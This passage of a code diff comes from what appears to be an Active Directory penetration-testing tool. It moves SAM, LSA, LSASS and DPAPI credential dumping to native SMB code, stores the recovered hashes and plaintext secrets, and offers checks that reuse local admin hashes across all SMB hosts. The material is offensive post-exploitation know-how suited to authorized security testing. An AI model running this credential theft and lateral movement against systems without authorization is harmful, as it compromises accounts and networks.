+                title=f"[{_MUTED}]Local Admin Reuse[/{_MUTED}]",
+                border_style=_MUTED,
+                padding=(0, 1),
+            )
+        )
+
+
+def _offer_native_local_admin_reuse(
+    shell: Any,
+    domain: str,
+    admin_creds: list[Any],
+) -> None:
+    """After single-host SAM dump: offer native reuse check for admin creds."""
+    from rich.prompt import Confirm as _RConfirm
+
+    workspace_dir = getattr(shell, "current_workspace_dir", None) or ""
+    targets_file, _ = resolve_domain_service_target_file(
+        workspace_dir,
+        shell.domains_dir,
+        domain,
+        service="smb",
+        domain_data=shell.domains_data.get(domain, {}),
+    )
+    if not targets_file:
+        return
+
+    n_hosts = len(_load_native_bulk_hosts(targets_file))
+    if not n_hosts:
+        return
+
+    concurrency = _native_dump_concurrency("sam")
+    est_s = max(n_hosts // concurrency, 1) * 3
+    est_label = f"~{est_s // 60}m {est_s % 60}s" if est_s >= 60 else f"~{est_s}s"
+
+    _CONSOLE.print(
+        Panel(
+            f"[{_ACID}]  {len(admin_creds)} local admin credential{'s' if len(admin_creds) != 1 else ''} found.[/{_ACID}]\n"
+            f"[{_MUTED}]  Run reuse check against {n_hosts} hosts? ({est_label}, concurrency {concurrency})[/{_MUTED}]",
+            title=f"[bold {_ICE}]◈  Local Admin Reuse Check[/bold {_ICE}]",
+            border_style=_ICE,
+            padding=(0, 1),
+        )
+    )
+
+    if not _RConfirm.ask(f"  [{_ICE}]Proceed?[/{_ICE}]", default=True):
+        return
+
+    for cred in admin_creds:
+        _run_native_async(
+            _run_native_local_admin_reuse_check_async(
+                shell, domain, cred.username, cred.nt_hash, targets_file
+            )
+        )
+
+
+def _build_native_sam_reuse_candidates(
+    *,
+    credentials: list[Any],
+    source_host: str,
+) -> list[dict[str, Any]]:
+    """Build SAM-derived reuse candidates for native single-host dumps."""
+    candidates: list[dict[str, Any]] = []
+    seen: set[tuple[str, str, str]] = set()
+    for cred in credentials:
+        username = str(getattr(cred, "username", "") or "").strip()
+        nt_hash = str(getattr(cred, "nt_hash", "") or "").strip()
+        if not username or not nt_hash:
+            continue
+        rid = str(getattr(cred, "rid", "-") or "-").strip() or "-"
+        key = (username.casefold(), rid, nt_hash.lower())
+        if key in seen:
+            continue
+        seen.add(key)
+        candidates.append(
+            {
+                "username": username,
+                "rid": rid,
+                "source_hosts": 1,
+                "source_hostnames": [source_host] if source_host else [],
+                "credential": nt_hash,
+                "credential_was_cracked": False,
+            }
+        )
+    return candidates
+
+
+def _native_execute_dump_sam(
+    shell: Any,
+    *,
+    domain: str,
+    host: str,
+    auth_username: str | None,
+) -> None:
+    """Native SAM dump: hive download + SAMR admin tag + inline admin badges.
+
+    After the dump, if admin credentials are found, offers a native reuse
+    check (replaces netexec --local-auth) against all SMB targets.
+    """
+    display = DumpDisplay()
+    workspace_dir = _native_workspace_dir(shell, domain)
+    config = _build_smb_config_from_shell(shell, host, domain)
+    svc = NativeDumpService()
+
+    display.operation_header("SAM Dump", host=host, phases=4)
+    display.phase_start(1, 4, "Building SMB connection")
+    display.phase_start(2, 4, "Saving SAM + SYSTEM hives via remote registry")
+    display.phase_start(3, 4, "Downloading hive files over SMB")
+    display.phase_start(4, 4, "Parsing credentials  ·  tagging Administrators")
+
+    try:
+        result = _run_native_async(svc.dump_sam(config, workspace_dir=workspace_dir))
+    except Exception as exc:
+        telemetry.capture_exception(exc)
+        display.phase_error(f"SAM dump failed: {exc}")
+        return
+
+    if not result.success:
+        display.phase_error(result.error or "SAM dump failed")
+        return
+
+    if not result.credentials:
+        display.no_credentials_found("SAM")
+        return
+
+    admin_creds: list[Any] = []
+    counts: dict[CredentialType, int] = {CredentialType.SAM: 0}
+
+    # Phase 1: display only (Live active, no console prints allowed).
+    display.start_credential_stream("SAM Hashes  ·  [ADM] = local admin")
+    try:
+        for cred in result.credentials:
+            account = f"{domain}\\{cred.username}" if domain else cred.username
+            display.stream_credential(
+                CredentialType.SAM,
+                account,
+                cred.nt_hash,
+                extras=_sam_admin_extras(cred),
+            )
+            counts[CredentialType.SAM] += 1
+            if (
+                cred.is_local_admin
+                and cred.nt_hash
+                and cred.nt_hash.lower() != _EMPTY_NTLM_HASH
+            ):
+                admin_creds.append(cred)
+    finally:
+        display.stop_credential_stream()
+
+    # Phase 2: persist (Live stopped, console is clean).
+    source_steps = _build_dump_source_steps(
+        domain=domain, dump_kind="SAM", host=host, auth_username=auth_username
+    )
+    add_kwargs: dict[str, Any] = {"source_steps": source_steps} if source_steps else {}
+    for cred in result.credentials:
+        try:
+            shell.add_credential(
+                domain,
+                cred.username,
+                cred.nt_hash,
+                host,
+                "smb",
+                verify_local_credential=False,
+                prompt_local_reuse_after=False,
+                ui_silent=True,
+                **add_kwargs,
+            )
+        except Exception as add_exc:
+            telemetry.capture_exception(add_exc)
+            print_warning(
+                f"Could not persist credential for {cred.username}: {add_exc}"
+            )
+
+    display.summary(counts, sum(counts.values()), host, elapsed=0)
+
+    # Offer native local admin reuse check for single-host dumps
+    if admin_creds:
+        _offer_native_local_admin_reuse(shell, domain, admin_creds)
+
+    _run_optional_domain_account_reuse_validation(
+        shell=shell,
+        domain=domain,
+        candidates=_resolve_reuse_candidate_credentials(
+            shell=shell,
+            candidates=_build_native_sam_reuse_candidates(
+                credentials=list(result.credentials),
+                source_host=host,
+            ),
+        ),
+        source_scope="SAM dump (single host)",
+        local_validation_results=[],
+    )
+
+
+def _native_execute_dump_lsa(
+    shell: Any,
+    *,
+    domain: str,
+    host: str,
+    auth_username: str | None,
+    include_machine_accounts: bool,
+) -> None:
+    """Native LSA dump fast-path using NativeDumpService + DumpDisplay."""
+    display = DumpDisplay()
+    workspace_dir = _native_workspace_dir(shell, domain)
+    config = _build_smb_config_from_shell(shell, host, domain)
+    svc = NativeDumpService()
+
+    display.operation_header("LSA Dump", host=host, phases=4)
+    display.phase_start(1, 4, "Building SMB connection")
+    display.phase_start(2, 4, "Saving SECURITY + SYSTEM hives via remote registry")
+    display.phase_start(3, 4, "Downloading hive files over SMB")
+    display.phase_start(4, 4, "Parsing LSA secrets")
+
+    try:
+        result = _run_native_async(svc.dump_lsa(config, workspace_dir=workspace_dir))
+    except Exception as exc:
+        telemetry.capture_exception(exc)
+        display.phase_error(f"LSA dump failed: {exc}")
+        return
+
+    if not result.success:
+        display.phase_error(result.error or "LSA dump failed")
+        return
+
+    has_machine_hash = bool(result.machine_account_nt_hash)
+    if not result.secrets and not has_machine_hash:
+        display.no_credentials_found("LSA")
+        return
+
+    # Resolve DC short hostname for machine account naming and AES salt.
+    # When host is an IP (e.g. "10.129.229.17"), host.split('.')[0] = "10" which
+    # is meaningless. Prefer the pdc_hostname from domains_data; fall back to
+    # stripping the domain label from an FQDN; last resort use the raw host value.
+    import re as _re
+    _is_ip = bool(_re.match(r"^\d+\.\d+\.\d+\.\d+$", host or ""))
+    if _is_ip:
+        _dc_short = (
+            str(
+                (shell.domains_data.get(domain) or {}).get("pdc_hostname") or host
+            ).split(".")[0]
+        )
+    elif "." in host:
+        _dc_short = host.split(".")[0]
+    else:
+        _dc_short = host
+
+    counts: dict[CredentialType, int] = {CredentialType.LSA: 0}
+    machine_user: str | None = None
+
+    # Phase 1: display only (Live active, no console prints allowed).
+    display.start_credential_stream("LSA Secrets")
+    try:
+        if has_machine_hash:
+            machine_user = f"{_dc_short.upper()}$"
+            display.stream_credential(
+                CredentialType.LSA,
+                f"{domain}\\{machine_user}" if domain else machine_user,
+                result.machine_account_nt_hash or "",
+                extras="machine account",
+            )
+            counts[CredentialType.LSA] += 1
+        for secret in result.secrets:
+            value = secret.plaintext or (secret.raw.hex() if secret.raw else "")
+            display.stream_credential(
+                CredentialType.LSA,
+                secret.name,
+                value,
+                extras="LSA secret",
+            )
+            counts[CredentialType.LSA] += 1
+    finally:
+        display.stop_credential_stream()
+
+    # Phase 2: persist machine account hash + AES keys.
+    if include_machine_accounts and machine_user and result.machine_account_nt_hash:
+        try:
+            from adscan_internal.cli.machine_account_persist import (
+                persist_machine_account_credential,
+            )
+            persist_machine_account_credential(
+                shell,
+                domain=domain,
+                machine_account=machine_user,
+                nt_hash=result.machine_account_nt_hash,
+                kerberos_password=result.machine_account_kerberos_password,
+                dc_hostname=_dc_short or None,
+                source_steps=_build_dump_source_steps(
+                    domain=domain,
+                    dump_kind="LSA",
+                    host=host,
+                    auth_username=auth_username,
+                    credential_username=machine_user,
+                    secret=result.machine_account_nt_hash,
+                ),
+                skip_hash_cracking=True,
+                verify_credential=False,
+                prompt_for_user_privs_after=False,
+                ensure_fresh_kerberos_ticket=False,
+                ui_silent=True,
+                credential_origin="lsa_secrets",
+            )
+        except Exception as add_exc:
+            telemetry.capture_exception(add_exc)
+
+    # Phase 3: persist service secrets (plaintext passwords from LSA).
+    # These include DefaultPassword (attributed to the real user via Winlogon
+    # query), service account credentials stored in LSA, and any other
+    # non-internal LSA secrets with a recoverable plaintext value.
+    _SKIP_LSA_NAMES = {"$MACHINE.ACC", "DPAPI_SYSTEM(machine)", "DPAPI_SYSTEM(user)"}
+    for secret in result.secrets:
+        if not secret.plaintext:
+            continue
+        if secret.name in _SKIP_LSA_NAMES:
+            continue
+        try:
+            shell.add_credential(
+                domain,
+                secret.name,
+                secret.plaintext,
+                prompt_for_user_privs_after=True,
+                credential_origin="lsa_secrets",
+            )
+        except Exception as svc_exc:
+            telemetry.capture_exception(svc_exc)
+
+    display.summary(counts, sum(counts.values()), host, elapsed=0)
+
+
+def _native_execute_dump_lsass(
+    shell: Any,
+    *,
+    domain: str,
+    host: str,
+) -> None:
+    """Native LSASS dump fast-path using NativeDumpService + DumpDisplay."""
+    display = DumpDisplay()
+    workspace_dir = _native_workspace_dir(shell, domain)
+    config = _build_smb_config_from_shell(shell, host, domain)
+    svc = NativeDumpService()
+
+    display.operation_header("LSASS Dump", host=host, phases=3)
+    display.phase_start(1, 3, "Triggering remote LSASS minidump")
+    display.phase_start(2, 3, "Streaming dump file over SMB")
+    display.phase_start(3, 3, "Parsing credentials with pypykatz")
+
+    try:
+        result = _run_native_async(
+            svc.dump_lsass(config, workspace_dir=workspace_dir, prefer_backend="auto")
+        )
+    except Exception as exc:
+        telemetry.capture_exception(exc)
+        display.phase_error(f"LSASS dump failed: {exc}")
+        return
+
+    if not result.success:
+        display.phase_error(result.error or "LSASS dump failed")
+        return
+
+    if not result.credentials:
+        display.no_credentials_found("LSASS")
+        return
+
+    counts: dict[CredentialType, int] = {CredentialType.LSASS: 0}
+
+    # Phase 1: display only (Live active, no console prints allowed).
+    display.start_credential_stream(f"LSASS Credentials (backend={result.backend})")
+    try:
+        for cred in result.credentials:
+            account = (
+                f"{cred.domain}\\{cred.username}" if cred.domain else cred.username
+            )
+            secret = cred.nt_hash or cred.lm_hash or cred.sha1 or ""
+            display.stream_credential(CredentialType.LSASS, account, secret)
+            counts[CredentialType.LSASS] += 1
+    finally:
+        display.stop_credential_stream()
+
+    display.summary(counts, sum(counts.values()), host, elapsed=0)
+
+    # Phase 2: persist (Live stopped, verification + TGT panels render cleanly).
+    _creds = getattr(shell, "current_creds", None) or {}
+    auth_username: str | None = str(_creds.get("username") or "").strip() or None
+    for cred in result.credentials:
+        if cred.username and (cred.nt_hash or cred.lm_hash or cred.sha1):
+            secret = cred.nt_hash or cred.lm_hash or cred.sha1 or ""
+            try:
+                shell.add_credential(
+                    domain or cred.domain,
+                    cred.username,
+                    secret,
+                    source_steps=_build_dump_source_steps(
+                        domain=domain,
+                        dump_kind="LSASS",
+                        host=host,
+                        auth_username=auth_username,
+                        credential_username=cred.username,
+                        secret=secret,
+                        source_protocol="smb",
+                    ),
+                    skip_hash_cracking=False,
+                    verify_credential=False,
+                    prompt_for_user_privs_after=False,
+                    ensure_fresh_kerberos_ticket=False,
+                    ui_silent=True,
+                    credential_origin="lsass_dump",
+                )
+            except Exception as add_exc:
+                telemetry.capture_exception(add_exc)
+
+
+def _native_execute_dump_dpapi(
+    shell: Any,
+    *,
+    domain: str,
+    host: str,
+    auth_username: str | None,
+) -> None:
+    """Native DPAPI dump: auto-detecting DA and non-DA routes."""
+    import tempfile
+    from adscan_internal.services.exploitation.dump_display import DumpDisplay
+
+    display = DumpDisplay()
+    domains_data = getattr(shell, "domains_data", None) or {}
+    pdc_ip = str(domains_data.get(domain, {}).get("pdc") or "").strip()
+    pdc_hostname: str | None = (domains_data.get(domain) or {}).get("pdc_hostname")
+
+    if not pdc_ip:
+        print_error("DPAPI dump requires a known PDC. Run enumeration first.")
+        return
+
+    # --- Phase 1: DA detection from workspace ---
+    known_da: bool | None = None
+    get_admins = getattr(shell, "get_domain_admins", None)
+    if callable(get_admins):
+        try:
+            da_list = get_admins(domain) or []
+            creds = getattr(shell, "current_creds", None) or {}
+            current_user = (creds.get("username") or "").lower()
+            if current_user and da_list:
+                known_da = current_user in [u.lower() for u in da_list]
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+
+    # Determine mode label for header (may be updated after live probe)
+    mode_label = (
+        "da" if known_da is True else ("non-da" if known_da is False else "unknown")
+    )
+    display.dpapi_operation_header(
+        domain=mark_sensitive(domain, "domain"),
+        target_host=mark_sensitive(host, "host"),
+        mode=mode_label,
+    )
+
+    # Show mode line up front
+    if known_da is None:
+        display.dpapi_phase_done(1, 4, True, "Probing DC for DA status...")
+    elif known_da:
+        display.dpapi_phase_done(1, 4, True, "DA confirmed (workspace)")
+    else:
+        display.dpapi_phase_done(
+            1,
+            4,
+            False,
+            "Non-DA: switching to password + DPAPI_SYSTEM route",
+        )
+
+    config = _build_smb_config_from_shell(shell, host, domain)
+    config.target_ip = host
+    config.target_hostname = host
+    config.kdc_ip = pdc_ip
+
+    display.dpapi_phase_done(2, 4, True, "Acquiring keys...")
+
+    svc = DpapiNativeDumpService()
+    with tempfile.TemporaryDirectory(prefix="adscan-dpapi-") as tmp:
+        result: DpapiFullDumpResult = _run_native_async(
+            svc.dump(
+                config,
+                target_host=host,
+                domain=domain,
+                workspace_dir=Path(tmp),
+                known_da=known_da,
+                pdc_ip=pdc_ip,
+                pdc_hostname=pdc_hostname,
+            )
+        )
+
+    total_mk = len(result.decrypted_masterkeys) + len(result.locked_masterkeys)
+    dec_mk = len(result.decrypted_masterkeys)
+
+    if result.mode == "non-da":
+        text = (
+            f"{dec_mk} masterkeys decrypted (password + DPAPI_SYSTEM)"
+            if dec_mk
+            else "0 masterkeys decrypted (no matching keys)"
+        )
+        display.dpapi_phase_done(3, 4, dec_mk > 0, text)
+    else:
+        text = (
+            f"{dec_mk} masterkeys decrypted via backup key"
+            if dec_mk
+            else "0 masterkeys decrypted"
+        )
+        display.dpapi_phase_done(3, 4, dec_mk > 0, text)
+
+    n_creds = len(result.credentials)
+    display.dpapi_phase_done(
+        4, 4, True, "Looting Credential Manager + Vault + Browsers"
+    )
+
+    # --- Classify + verify candidates against the domain ---
+    from adscan_internal.services.exploitation.dpapi_credential_processor import (
+        process_dpapi_credentials,
+    )
+
+    ad_users = _load_dpapi_ad_users(shell, domain)
+    enriched = _run_native_async(
+        process_dpapi_credentials(
+            result.credentials,
+            domain=domain,
+            pdc_ip=pdc_ip,
+            domains_data=domains_data,
+            ad_users=ad_users,
+        )
+    )
+
+    # Display: full provenance table if we have credentials, summary otherwise.
+    if enriched:
+        display.dpapi_provenance_table(enriched)
+    else:
+        display.no_credentials_found("DPAPI")
+
+    pvk_preview = result.backup_key_pvk[:4].hex() if result.backup_key_pvk else None
+    display.dpapi_footer(
+        decrypted=dec_mk,
+        total_masterkeys=total_mk,
+        cred_count=n_creds,
+        mode=result.mode,
+        elapsed=result.elapsed_seconds,
+        backup_key_preview=pvk_preview,
+    )
+
+    if result.errors:
+        for err in result.errors:
+            print_warning(f"DPAPI: {err}")
+
+    # --- Workspace persistence ---
+    _persist_dpapi_result(shell, result, enriched=enriched, domain=domain, host=host)
 
 
 def execute_dump_lsa(
@@ -2629,219 +4754,27 @@ def execute_dump_lsa(
     domain: str,
     host: str,
     auth_username: str | None = None,
-    include_machine_accounts: bool = False,
+    include_machine_accounts: bool = True,
 ) -> None:
-    """Execute LSA dump command and process credentials from output."""
+    """Execute an LSA dump through the native async SMB stack only."""
+    _ = command
     try:
-        timeout_seconds = _resolve_dump_command_timeout(host)
-        print_info_debug(
-            f"Using dump command timeout={timeout_seconds}s for host target '{host}'."
-        )
-        completed_process = shell.run_command(command, timeout=timeout_seconds)
-        if completed_process is None:
-            print_error("Error executing LSA dump: command failed to return output.")
-            return
-        output = completed_process.stdout
-        errors_output = completed_process.stderr
-
-        if completed_process.returncode == 0:
-            auth_failure = parse_netexec_delegated_auth_failure(
-                output
-            ) or parse_netexec_delegated_auth_failure(errors_output)
-            if auth_failure:
-                print_error(
-                    "Error executing LSA dump: "
-                    f"{auth_failure.line}"
-                )
-                return
-            bulk_mode = _is_bulk_dump_target(host)
-            bulk_summary: dict[str, dict[str, Any]] = {}
-            bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
-            excluded = {
-                "]",
-                "guest",
-                "invitado",
-                "defaultaccount",
-                "wdagutilityaccount",
-                "dpapi_machinekey",
-                "plain_password_hex",
-                "des-cbc-md5",
-                "aes256-cts-hmac-sha1-96",
-                "nl$km",
-                "aes128-cts-hmac-sha1-96",
-                "dcc2",
-            }
-            credential_entries = _extract_dumped_credentials_with_hosts(
-                output, excluded_substrings=excluded
-            )
-            # Process each line of output
-            candidate_entries = credential_entries or [
-                (line, None) for line in output.splitlines()
-            ]
-            for line, parsed_host in candidate_entries:
-                if not line.strip():  # Skip empty lines
-                    continue
-                if _NXC_STATUS_TOKEN_RE.search(line):
-                    continue
-
-                # Pattern to detect NTLM hashes (32 hexadecimal characters)
-                hash_pattern = r"[a-fA-F0-9]{32}:[a-fA-F0-9]{32}"
-
-                # Case 1: Line contains an NTLM hash
-                if re.search(hash_pattern, line):
-                    parts = line.split(":")
-                    if len(parts) >= 4:
-                        user_domain = parts[0]
-                        nt_hash = parts[3]  # NT hash is always the fourth field
-                        # Extract only the username without the domain
-                        username = user_domain.split("\\")[-1]
-                        # By default we skip computer accounts for routine dumps.
-                        # Attack-path post-compromise flows can override this.
-                        if (
-                            include_machine_accounts or not username.endswith("$")
-                        ) and nt_hash.lower() != "31d6cfe0d16ae931b73c59d7e0c089c0":
-                            step_host = _resolve_step_host(
-                                parsed_host=parsed_host, requested_host=host
-                            )
-                            if bulk_mode:
-                                _record_bulk_finding(
-                                    bulk_summary,
-                                    host=step_host,
-                                    username=username,
-                                    is_hash=True,
-                                )
-                                _record_bulk_credential(
-                                    bulk_credentials,
-                                    username=username,
-                                    credential=nt_hash,
-                                    is_hash=True,
-                                    host=step_host,
-                                )
-                            else:
-                                marked_username = mark_sensitive(username, "user")
-                                marked_nt_hash = mark_sensitive(nt_hash, "password")
-                                marked_host = mark_sensitive(
-                                    step_host or "unknown host", "hostname"
-                                )
-                                print_warning(
-                                    f"Hash found from LSA dump on {marked_host} - User: {marked_username}, NT Hash: {marked_nt_hash}"
-                                )
-                            if not bulk_mode:
-                                add_kwargs: dict[str, Any] = {}
-                                if include_machine_accounts and username.endswith("$"):
-                                    add_kwargs.update(
-                                        {
-                                            "skip_hash_cracking": True,
-                                            "verify_credential": False,
-                                            "prompt_for_user_privs_after": False,
-                                            "ensure_fresh_kerberos_ticket": False,
-                                            "ui_silent": True,
-                                        }
-                                    )
-                                shell.add_credential(
-                                    domain,
-                                    username,
-                                    nt_hash,
-                                    source_steps=_build_dump_source_steps(
-                                        domain=domain,
-                                        dump_kind="LSA",
-                                        host=step_host,
-                                        auth_username=auth_username,
-                                        credential_username=username,
-                                        secret=nt_hash,
-                                    ),
-                                    **add_kwargs,
-                                )
-
-                # Case 2: Plaintext password
-                elif (
-                    ":" in line
-                    and not re.search(hash_pattern, line)
-                    and ("\\" in line or "@" in line)
-                ):
-                    try:
-                        user_part, password = line.rsplit(":", 1)
-                        # Extract only the username without domain/realm.
-                        username = _extract_username_from_lsa_identity(user_part)
-                        if password and (
-                            include_machine_accounts or not username.endswith("$")
-                        ):
-                            step_host = _resolve_step_host(
-                                parsed_host=parsed_host, requested_host=host
-                            )
-                            if bulk_mode:
-                                _record_bulk_finding(
-                                    bulk_summary,
-                                    host=step_host,
-                                    username=username,
-                                    is_hash=False,
-                                )
-                                _record_bulk_credential(
-                                    bulk_credentials,
-                                    username=username,
-                                    credential=password,
-                                    is_hash=False,
-                                    host=step_host,
-                                )
-                            else:
-                                marked_username = mark_sensitive(username, "user")
-                                marked_password = mark_sensitive(password, "password")
-                                marked_host = mark_sensitive(
-                                    step_host or "unknown host", "hostname"
-                                )
-                                print_warning(
-                                    f"Credential found on {marked_host} - User: {marked_username}, Password: {marked_password}"
-                                )
-                            if not bulk_mode:
-                                add_kwargs = {}
-                                if include_machine_accounts and username.endswith("$"):
-                                    add_kwargs.update(
-                                        {
-                                            "skip_hash_cracking": True,
-                                            "verify_credential": False,
-                                            "prompt_for_user_privs_after": False,
-                                            "ensure_fresh_kerberos_ticket": False,
-                                            "ui_silent": True,
-                                        }
-                                    )
-                                shell.add_credential(
-                                    domain,
-                                    username,
-                                    password,
-                                    source_steps=_build_dump_source_steps(
-                                        domain=domain,
-                                        dump_kind="LSA",
-                                        host=step_host,
-                                        auth_username=auth_username,
-                                        credential_username=username,
-                                        secret=password,
-                                    ),
-                                    **add_kwargs,
-                                )
-                    except ValueError as e:
-                        telemetry.capture_exception(e)
-                        print_warning(f"Could not process the line: {line.strip()}")
-
-            if bulk_mode:
-                _persist_bulk_credentials(
-                    shell,
-                    domain=domain,
-                    dump_kind="LSA",
-                    auth_username=auth_username,
-                    credentials=bulk_credentials,
-                    include_machine_accounts=include_machine_accounts,
-                )
-                _print_bulk_summary(dump_kind="LSA", summary=bulk_summary)
-            print_info("LSA dump processing completed")
-        else:
-            error_message = errors_output.strip() if errors_output else output.strip()
+        if not _native_dump_supported(shell, host):
             print_error(
-                f"Error executing LSA dump: {error_message if error_message else 'Details not available'}"
+                "Native LSA dump cannot start because no usable native SMB credential "
+                "context is available. external-command fallback has been removed."
             )
-
+            return
+        _native_execute_dump_lsa(
+            shell,
+            domain=domain,
+            host=host,
+            auth_username=auth_username,
+            include_machine_accounts=include_machine_accounts,
+        )
     except Exception as e:
         telemetry.capture_exception(e)
-        print_error("Error during LSA dump.")
+        print_error("Error during native LSA dump.")
         print_exception(show_locals=False, exception=e)
 
 
@@ -2852,297 +4785,24 @@ def execute_dump_sam(
     host: str,
     auth_username: str | None = None,
 ) -> None:
-    """Execute SAM dump command and process credentials from output."""
+    """Execute a SAM dump through the native async SMB stack only."""
+    _ = command
     try:
-        timeout_seconds = _resolve_dump_command_timeout(host)
-        print_info_debug(
-            f"Using dump command timeout={timeout_seconds}s for host target '{host}'."
-        )
-        completed_process = shell.run_command(command, timeout=timeout_seconds)
-        if completed_process is None:
-            print_error("Error executing SAM dump: command failed to return output.")
-            return
-        output = completed_process.stdout
-        errors_output = completed_process.stderr
-
-        if completed_process.returncode == 0:
-            bulk_mode = _is_bulk_dump_target(host)
-            bulk_summary: dict[str, dict[str, Any]] = {}
-            bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
-            reuse_candidate_map: dict[tuple[str, str], dict[str, Any]] = {}
-            reuse_decisions: dict[tuple[str, str, str], tuple[bool, str]] = {}
-            reuse_total_discovered = 0
-            reuse_excluded_counts: dict[str, int] = {}
-            excluded = {"]"}
-            credential_entries = _extract_dumped_credentials_with_hosts(
-                output, excluded_substrings=excluded
-            )
-            # Process each line of output
-            candidate_entries = credential_entries or [
-                (line, None) for line in output.splitlines()
-            ]
-            for line, parsed_host in candidate_entries:
-                if not line.strip():  # Skip empty lines
-                    continue
-                if _NXC_STATUS_TOKEN_RE.search(line):
-                    continue
-
-                # Pattern to detect NTLM hashes (32 hexadecimal characters)
-                hash_pattern = r"[a-fA-F0-9]{32}:[a-fA-F0-9]{32}"
-
-                # Case 1: Line contains an NTLM hash
-                if re.search(hash_pattern, line):
-                    parts = line.split(":")
-                    if len(parts) >= 4:
-                        user_domain = parts[0]
-                        rid = parts[1] if len(parts) > 1 else ""
-                        nt_hash = parts[3]  # NT hash is always the fourth field
-                        # Extract only the username without the domain
-                        username = user_domain.split("\\")[-1]
-                        rid_clean = _normalize_sam_rid(rid)
-                        nt_hash_clean = str(nt_hash).strip().lower()
-                        step_host = _resolve_step_host(
-                            parsed_host=parsed_host, requested_host=host
-                        )
-                        include_for_storage, _storage_reason = (
-                            _should_include_for_reuse_validation(
-                                username=username,
-                                rid=rid_clean,
-                                nt_hash=nt_hash,
-                            )
-                        )
-                        if bulk_mode:
-                            decision_key = (
-                                str(username).strip().lower(),
-                                nt_hash_clean,
-                                rid_clean,
-                            )
-                            decision = reuse_decisions.get(decision_key)
-                            if decision is None:
-                                decision = (include_for_storage, _storage_reason)
-                                reuse_decisions[decision_key] = decision
-                                reuse_total_discovered += 1
-                                if not decision[0]:
-                                    reason = str(decision[1]).strip() or "other"
-                                    reuse_excluded_counts[reason] = (
-                                        int(reuse_excluded_counts.get(reason, 0)) + 1
-                                    )
-                            include_for_reuse = bool(decision[0])
-                        else:
-                            include_for_reuse = include_for_storage
-                        if include_for_storage:
-                            if bulk_mode:
-                                _record_bulk_finding(
-                                    bulk_summary,
-                                    host=step_host,
-                                    username=username,
-                                    is_hash=True,
-                                )
-                                _record_bulk_credential(
-                                    bulk_credentials,
-                                    username=username,
-                                    credential=nt_hash,
-                                    is_hash=True,
-                                    host=step_host,
-                                )
-                            else:
-                                marked_username = mark_sensitive(username, "user")
-                                marked_nt_hash = mark_sensitive(nt_hash, "password")
-                                marked_host = mark_sensitive(
-                                    step_host or "unknown host", "hostname"
-                                )
-                                print_warning(
-                                    f"Hash found from SAM dump on {marked_host} - Local User: {marked_username}, NT Hash: {marked_nt_hash}"
-                                )
-                            if not bulk_mode:
-                                source_steps = _build_dump_source_steps(
-                                    domain=domain,
-                                    dump_kind="SAM",
-                                    host=step_host,
-                                    auth_username=auth_username,
-                                )
-                                add_kwargs: dict[str, object] = {}
-                                if source_steps:
-                                    add_kwargs["source_steps"] = source_steps
-                                shell.add_credential(
-                                    domain,
-                                    username,
-                                    nt_hash,
-                                    host,
-                                    "smb",
-                                    verify_local_credential=False,
-                                    prompt_local_reuse_after=False,
-                                    **add_kwargs,
-                                )
-                            if include_for_reuse:
-                                key = (
-                                    str(username).strip().lower(),
-                                    nt_hash_clean,
-                                )
-                                current = reuse_candidate_map.setdefault(
-                                    key,
-                                    {
-                                        "username": str(username).strip(),
-                                        "credential": str(nt_hash).strip(),
-                                        "rid": rid_clean,
-                                        "hosts": set(),
-                                    },
-                                )
-                                hosts_set = current.get("hosts")
-                                if isinstance(hosts_set, set):
-                                    hosts_set.add(str(step_host or "").strip())
-
-                # Case 2: Plaintext password
-                elif "\\" in line and ":" in line and not re.search(hash_pattern, line):
-                    try:
-                        user_part, password = line.rsplit(":", 1)
-                        # Extract only the username without the domain
-                        username = user_part.split("\\")[-1]
-                        include_plaintext, _plaintext_reason = (
-                            _should_include_plaintext_sam_account(username=username)
-                        )
-                        if password and include_plaintext:
-                            step_host = _resolve_step_host(
-                                parsed_host=parsed_host, requested_host=host
-                            )
-                            if bulk_mode:
-                                _record_bulk_finding(
-                                    bulk_summary,
-                                    host=step_host,
-                                    username=username,
-                                    is_hash=False,
-                                )
-                                _record_bulk_credential(
-                                    bulk_credentials,
-                                    username=username,
-                                    credential=password,
-                                    is_hash=False,
-                                    host=step_host,
-                                )
-                            else:
-                                marked_username = mark_sensitive(username, "user")
-                                marked_password = mark_sensitive(password, "password")
-                                marked_host = mark_sensitive(
-                                    step_host or "unknown host", "hostname"
-                                )
-                                print_success(
-                                    f"Credential found on {marked_host} - User: {marked_username}, Password: {marked_password}"
-                                )
-                            if not bulk_mode:
-                                source_steps = _build_dump_source_steps(
-                                    domain=domain,
-                                    dump_kind="SAM",
-                                    host=step_host,
-                                    auth_username=auth_username,
-                                )
-                                add_kwargs: dict[str, object] = {}
-                                if source_steps:
-                                    add_kwargs["source_steps"] = source_steps
-                                shell.add_credential(
-                                    domain,
-                                    username,
-                                    password,
-                                    host,
-                                    "smb",
-                                    verify_local_credential=False,
-                                    prompt_local_reuse_after=False,
-                                    **add_kwargs,
-                                )
-                    except ValueError as e:
-                        telemetry.capture_exception(e)
-                        print_warning(f"Could not process the line: {line.strip()}")
-
-            if bulk_mode:
-                _persist_bulk_sam_local_credentials(
-                    shell,
-                    domain=domain,
-                    credentials=bulk_credentials,
-                )
-                _print_bulk_summary(dump_kind="SAM", summary=bulk_summary)
-                reuse_validation_candidates: list[dict[str, Any]] = []
-                for item in reuse_candidate_map.values():
-                    hosts_set = item.get("hosts")
-                    host_count = (
-                        len(
-                            [
-                                host_name
-                                for host_name in hosts_set
-                                if isinstance(host_name, str) and host_name.strip()
-                            ]
-                        )
-                        if isinstance(hosts_set, set)
-                        else 0
-                    )
-                    if host_count < 2:
-                        reuse_excluded_counts["not_reused_across_hosts"] = (
-                            int(reuse_excluded_counts.get("not_reused_across_hosts", 0))
-                            + 1
-                        )
-                        continue
-                    reuse_validation_candidates.append(
-                        {
-                            "username": str(item.get("username") or "").strip(),
-                            "credential": str(item.get("credential") or "").strip(),
-                            "rid": str(item.get("rid") or "").strip(),
-                            "source_hosts": host_count,
-                            "source_hostnames": sorted(
-                                str(host_name).strip()
-                                for host_name in hosts_set
-                                if isinstance(host_name, str) and str(host_name).strip()
-                            ),
-                        }
-                    )
-                _run_optional_local_admin_reuse_validation(
-                    shell,
-                    domain=domain,
-                    candidates=reuse_validation_candidates,
-                    total_discovered=reuse_total_discovered,
-                    excluded_by_reason=reuse_excluded_counts,
-                )
-            else:
-                single_host_candidates: list[dict[str, Any]] = []
-                for item in reuse_candidate_map.values():
